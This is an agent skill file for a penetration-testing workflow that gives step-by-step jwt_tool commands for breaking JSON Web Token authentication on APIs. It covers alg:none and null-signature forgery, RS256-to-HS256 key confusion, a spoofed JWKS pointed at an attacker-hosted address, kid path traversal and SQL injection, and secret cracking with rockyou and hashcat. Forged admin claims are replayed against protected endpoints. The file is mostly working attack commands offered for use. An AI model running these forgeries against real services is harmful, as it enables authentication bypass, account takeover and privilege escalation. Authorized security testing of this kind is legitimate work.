---
name: jwt-attacks
description: Attack JSON Web Token authentication on APIs with jwt_tool — decode and tamper tokens, forge alg:none and null-signature tokens, exploit RS256→HS256 key confusion, spoof/inject JWKS, abuse kid header (path traversal, SQLi), crack weak HMAC secrets, and verify forged tokens by replaying them against protected endpoints. Use during the authentication phase of API testing whenever a bearer token looks like a JWT (three dot-separated base64url segments starting eyJ).
license: Apache-2.0
metadata:
  author: Section9Labs
  version: "1.0.0"
---

# JWT Attacks (jwt_tool)

Attack the full JWT surface of an API's authentication: signature-bypass forgeries,
key confusion, header injection, secret cracking, and claim tampering — then prove
acceptance by replaying the forged token against a protected endpoint. This is
phase 3 (authentication) of the `api-testing` flow.

Primary tool: **jwt_tool** (ticarpi). Invoke as `jwt_tool` or `python3 jwt_tool.py`.
Full flag reference: `references/jwt-tool.md`. Per-attack detail (precondition,
command, confirmation, remediation): `references/attacks.md`. rupu wiring (work
units, assets, findings): `references/rupu.md`.

## 0. Prerequisites — capture the token and a baseline request

You need three things before attacking:

1. **A valid token** — from a login response, intercepted traffic, or the operator.
   A JWT looks like `eyJ...<header>.eyJ...<payload>.<signature>`.
2. **A protected endpoint** that returns differently with vs. without the token
   (e.g. `GET https://api.example.com/v1/me` → 200 with token, 401 without).
   This is your acceptance oracle for every forgery.
3. **How the token is sent** — `Authorization: Bearer <jwt>` header, a cookie,
   or a query/body parameter.

Record baselines now (status code + body length for: valid token, no token,
garbage token). `scripts/run_jwt_tool.py` does this automatically.

## 1. Decode and triage

```
python3 scripts/jwt_decode.py 'eyJhbGciOi...' --units reports/jwt-attacks-units.json
```

Pure-stdlib decode: prints header, payload, alg, `exp`/`iat`/`nbf`, `kid`,
`jku`/`x5u`/`jwk`/`x5c`, and a `flags` list of risky conditions (alg none, HS*
with an RSA public key in play, missing/absent `exp`, >1y lifetime, expired,
sensitive claims like `role`/`admin`/`scope`/`sub`). Each flag maps to an attack
work unit (see §5). Cross-check with jwt_tool itself:

```
jwt_tool 'eyJhbGciOi...'
```

Triage decisions from the decode:
- `alg: HS256/384/512` → secret cracking (§3.4); key confusion target if an RSA key exists anywhere.
- `alg: RS256/ES256/PS256` → key confusion (§3.2), JWKS spoof/inject (§3.3), alg:none (§3.1).
- `kid` present → kid injection (§3.5).
- `jku`/`x5u` present → attacker-hosted JWKS (§3.3).
- `jwk`/`x5c` embedded → extract the public key for key confusion; try self-signed inline JWKS (`-X i`).
- Fetch the server's JWKS regardless: `curl https://api.example.com/.well-known/jwks.json`
  (also try `/jwks.json`, `/.well-known/openid-configuration` → `jwks_uri`).
  Convert JWK → PEM for `-pk` (see `references/attacks.md` §2).

Mark the service and auth endpoint as assets now (`references/rupu.md`).

## 2. Automated scan against the live endpoint

Point jwt_tool at the real request so it can detect acceptance itself. `jwt_tool`
substitutes the literal string `jwt_tool` in `-rh`/`-rc`/`-pd` with each test token.

```
jwt_tool -t 'https://api.example.com/v1/me' \
         -rh 'Authorization: Bearer jwt_tool' \
         -rc 'session=jwt_tool' \
         -cv 'Welcome back' \
         -M pb 'eyJhbGciOi...'
```

- `-M pb` — playbook: decodes, checks claims, runs the standard bypass battery, reports which requests returned success.
- `-M at` — all tests: playbook plus every exploit and claim-fuzz mode. Noisy, thorough.
- `-M er` / `-M cc` — fuzz existing claims / inject common claims (great for finding trusted claims like `role`).
- `-cv 'string'` — canary that marks a *successful* (authenticated) response; without it jwt_tool keys on status codes.
- Persistent per-target settings (headers, jwks, proxy) live in `~/.jwt_tool/jwtconf.ini`.

Read the output: lines flagged `[+]` with an `jwttool_<id>` tag are candidate
wins; re-send that exact token manually to confirm (§4).

## 3. Targeted exploits

Run the scripted battery, or each attack by hand:

```
python3 scripts/run_jwt_tool.py --token 'eyJ...' \
    --url 'https://api.example.com/v1/me' \
    --header 'Authorization: Bearer TOKEN' \
    --pubkey public.pem --wordlist jwt.secrets.list \
    --attacks none,nullsig,blank,confusion,inject-jwks,crack \
    --outdir reports
```

It runs each jwt_tool exploit, extracts every forged token from the output,
replays each against `--url`, compares to the auth/unauth baselines, and writes
`reports/jwt-attacks-results.json` + `reports/jwt-attacks-units.json`.

### 3.1 alg:none — signature stripped

```
jwt_tool 'eyJ...' -X a
```

Emits four tokens (`none`/`None`/`NONE`/`nOnE`, filter-evasion casings), each
with an **empty signature segment** (trailing dot). If any is accepted, the
server never verifies signatures → forge arbitrary claims:

```
jwt_tool 'eyJ...' -X a -I -pc role -pv admin
```

Also try `-X n` (keep the alg, send a **null/empty signature**) — some parsers
skip verification when the signature segment is empty.

### 3.2 RS256→HS256 key confusion

Server verifies RS256 with its public key; if it also accepts HS256, the public
key becomes the HMAC secret — and the public key is public.

```
jwt_tool 'eyJ...' -X k -pk public.pem
```

Get `public.pem` from: the JWKS endpoint (convert JWK→PEM), an `x5c`/`jwk`
header, the TLS certificate, or **recover it from two tokens** with
`sig2n`/`jwt_forgery.py` (silentsignal rsa_sign2n — derives the RSA public key
from two RS256 signatures; it prints candidate PEMs and pre-forged HS256
tokens). Try every PEM encoding variant; jwt_tool handles the standard one, and
`-X k` output accepted on replay = total token forgery. Then tamper claims:

```
jwt_tool 'eyJ...' -X k -pk public.pem -I -pc user -pv admin
```

### 3.3 JWKS spoofing — jku/x5u and inline jwk

Attacker-controlled key material via header pointers:

```
# inline embedded JWK (CVE-2018-0114 pattern): new RSA keypair embedded in the header
jwt_tool 'eyJ...' -X i

# spoofed remote JWKS: generate keypair, sign token, point jku at your server
jwt_tool 'eyJ...' -X s -ju 'https://203.0.113.7/jwks.json'
```

`-X s` writes the JWKS file to serve (host it at the `-ju` URL; try open-redirect
or SSRF-reachable URLs if the server allowlists jku domains). Acceptance = the
server fetched *your* keys → sign anything.

### 3.4 Weak HMAC secret cracking

```
jwt_tool 'eyJ...' -C -d jwt.secrets.list
jwt_tool 'eyJ...' -C -d rockyou.txt
jwt_tool 'eyJ...' -C -p 'secret'          # test one guess
```

Success prints `[+] <secret> is the CORRECT key!`. For big lists use hashcat
mode 16500 (`hashcat -a 0 -m 16500 jwt.txt rockyou.txt`). Then forge at will:

```
jwt_tool 'eyJ...' -I -pc role -pv admin -S hs256 -p 'secret1'
```

### 3.5 kid header injection

The `kid` header tells the server which key verifies the token. If it's used
unsafely, you choose the key. Run jwt_tool's canned kid/header injections with
`-X i` variants via `-M at`, or craft by hand:

```
# Path traversal → /dev/null → key is empty string
jwt_tool 'eyJ...' -I -hc kid -hv '../../../../../dev/null' -S hs256 -p ''

# Predictable world-readable file as key (contents of /etc/hostname etc.)
jwt_tool 'eyJ...' -I -hc kid -hv '../../../../../etc/hostname' -S hs256 -p 'prodapi01'

# SQL injection in kid: make the key lookup return an attacker-known value
jwt_tool 'eyJ...' -I -hc kid -hv "x' UNION SELECT 'aaa" -S hs256 -p 'aaa'
```

`-X b` is the shortcut for the blank-password case. Any acceptance = key
selection is attacker-controlled.

### 3.6 Claim tampering, expiry, interactive mode

Once *any* signing bypass works, escalate through claims — identity (`sub`,
`user_id`, `email`), privilege (`role`, `admin`, `groups`, `scope`/`scp`),
tenant IDs, and lifetime (strip or extend `exp`):

```
jwt_tool 'eyJ...' -X a -I -pc sub -pv 'admin@example.com' -pc exp -pv 1999999999
jwt_tool 'eyJ...' -T        # interactive tamper: edit any claim, then choose signing
```

Also test **expired-token acceptance** (replay a token past `exp`) and
**cross-service replay** (token from service A accepted by service B — check
`aud`/`iss` enforcement). An unexpired token with no `exp` is itself a finding.

## 4. Verify acceptance — the only proof that counts

For every candidate forgery, replay against the protected endpoint and compare
to baselines:

```
curl -isk https://api.example.com/v1/me -H "Authorization: Bearer <forged>"
```

Accepted = response matches the valid-token baseline (status, and the body
reflects the *tampered* claims — e.g. you asked for `role=admin` and the
response shows admin data), and differs from the garbage-token baseline.
`scripts/run_jwt_tool.py` automates this comparison. A 200 that still shows the
original identity means the signature check passed but claims weren't what you
thought — re-check the tamper. Keep the exact request/response pair; it becomes
the finding evidence.

## 5. rupu output — units, assets, findings

Follow `references/rupu.md` exactly. Summary:

- **Work units**: both scripts write a clean JSON array of
  `{"id","title","targets","hints"}` atomically under `reports/` for
  `for_each`/`dispatch` fan-out. For splitting an OpenAPI/Swagger document per
  resource (to find more token-consuming endpoints), use the reporting pack's
  **`work-units`** skill (`split.py openapi`) — do not re-implement splitting.
- **Assets**: mark the API service and each auth-relevant endpoint with
  `assets.mark` (`api:service` / `api:endpoint`, depth `mapped` → `tested` →
  `exploited`). Wiring is in the **`coverage-assets`** skill.
- **Findings**: a forged token accepted on a protected endpoint is a confirmed
  finding — report with `findings.report` under the `api` profile, pinned to the
  endpoint's `http_route`, with an `http_exchange` evidence block. Field/CVSS
  contract is in the **`finding-report`** skill.
